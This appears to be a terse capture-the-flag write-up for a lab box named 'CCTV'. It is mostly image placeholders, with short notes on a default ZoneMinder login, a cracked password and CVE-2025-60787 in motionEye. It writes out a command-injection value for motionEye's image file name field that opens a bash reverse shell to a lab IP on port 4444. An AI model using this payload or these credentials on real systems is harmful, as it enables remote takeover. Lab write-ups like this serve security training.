https://medium.com/@c78925021/cctv-technical-writeup-154e51b75bc6

\# nmap

![[☆★CCTV image.png]]

![[☆★CCTV image 1.png]]

\# http

![[☆★CCTV image 2.png]]

![[☆★CCTV image 3.png]]

ZoneMInder Login admin:admin

![[☆★CCTV image 4.png]]

v1.36.63

認証済みのCookieのセッションID（ZMSESSID）が必要なため上記のようにログイン後、ZMSESSIDを取得し、以後活用する

![[☆★CCTV image 5.png]]

![[☆★CCTV image 6.png]]

![[☆★CCTV image 7.png]]

zm

![[☆★CCTV image 8.png]]

\# Hash Crack

![[☆★CCTV image 9.png]]

![[☆★CCTV image 10.png]]

![[☆★CCTV image 11.png]]

opensesame

\# InitialAccess

mark:opensesame

![[☆★CCTV image 12.png]]

![[☆★CCTV image 13.png]]

989c5a8ee87a0e9521ec81a79187d162109282f0

![[☆★CCTV image 14.png]]

\# CVE-2025–60787

\# PoC

https://github.com/motioneye-project/motioneye/security/advisories/GHSA-j945-qm58-4gjx

\## Test

![[☆★CCTV image 15.png]]

\# Exploit

![[☆★CCTV image 16.png]]

![[☆★CCTV image 17.png]]

Image File Name

$(python3 -c 'import os;os.system("bash -c \"bash -i >& /dev/tcp/10.10.15.216/4444 0>&1\"")').%Y-%m-%d-%H-%M-%S

Capture mode

Intercal Snapshots

Snapshot Interval

10

Apply

\# Flag

![[☆★CCTV image 18.png]]